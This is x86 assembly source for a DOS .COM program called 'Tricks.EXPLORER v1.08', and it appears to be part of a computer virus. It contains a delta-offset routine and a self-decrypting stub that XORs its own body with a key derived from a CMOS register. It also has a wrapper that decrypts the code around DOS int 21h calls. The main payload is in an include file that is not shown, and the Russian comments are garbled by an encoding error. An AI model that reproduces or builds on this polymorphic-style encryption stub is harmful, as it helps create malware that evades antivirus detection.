;************************************************
;*	Tricks.EXPLORER v1.08                   *
;************************************************
.286
TestS	segment
	assume	cs:TestS,ds:TestS,ss:TestS
	org	100h
;
Shift	= ((Next-Start)+100h)	
CryptLen= CopyRT-Crypted
;
Start:
	call	Next
Next:
	pop	si
	sub	si,Shift
	call	Crypt	
;
Crypted:
;************************************************
	include	trexp.inc ; ����஢���         *
;************************************************
CopyRT	db	0,'[Tricks.EXPLORER] v1.08',0
;
WriV:
	call	Crypt
	int	21h
	call	Crypt
	ret
;************************************************
;*	�����஢騪                            * 
;************************************************
Crypt:
	pusha
; ��������� �� CMOS ����⠭�� 2Xh
	mov	al, 19h
	out	70h, al
	jmp	$+2
	in	al, 71h
; �ਢ���� �� � ���� 20h
	and	al, 11110000b
; ������㥬 55h
	add	al, (55h-20h)			
;
	lea	bx, Crypted[si]
	mov	cx, CryptLen
Circle:	
	xor	byte ptr [bx], al
	inc	bx
	loop	Circle
	popa
	ret
;
Finish:
;
Tests	ends
	End	Start
